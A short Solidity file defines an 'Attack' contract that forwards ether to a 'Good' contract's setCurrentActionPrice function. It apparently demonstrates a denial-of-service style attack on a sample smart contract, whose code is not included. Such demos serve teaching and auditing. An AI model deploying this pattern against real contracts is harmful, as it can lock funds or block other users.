// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "./Good.sol";

contract Attack {
    Good good;

    constructor(address _good) {
        good = Good(_good);
    }

    function attact() public payable {
        good.setCurrentActionPrice{value: msg.value}();
    }
}
